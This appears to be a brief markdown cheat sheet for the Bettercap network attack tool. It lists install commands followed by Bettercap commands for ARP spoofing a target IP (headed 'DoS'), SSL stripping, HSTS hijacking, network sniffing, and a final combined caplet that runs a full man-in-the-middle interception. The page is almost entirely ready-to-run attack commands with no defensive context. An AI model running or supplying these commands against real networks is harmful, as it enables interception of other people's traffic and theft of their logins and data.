---
title: Bettercap
---

# Bettercap

```shell 
sudo apt update
sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
```

```shell
go get -u github.com/bettercap/bettercap
```

```shell
sudo bettercap -iface enp3s0f0 -caplet http-ui
```

```go
http-ui
```


```go
caplets.show
```

## DoS

```go
set arp.spoof.targets 192.168.1.100
```

## HTTTP proxy

```go
set http.proxy.sslstrip true
```


```go
hstshijack/hstshijack 
```


```go
net.probe on
```


```go
net.sniff on
```

```go
set arp.spoof.fullduplex true
arp.spoof on
```

https://github.com/PrettyBoyCosmo/HTTP-List


```
set http.proxy.sslstrip true
set net.sniff.verbose false
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
http.proxy on
net.sniff on
```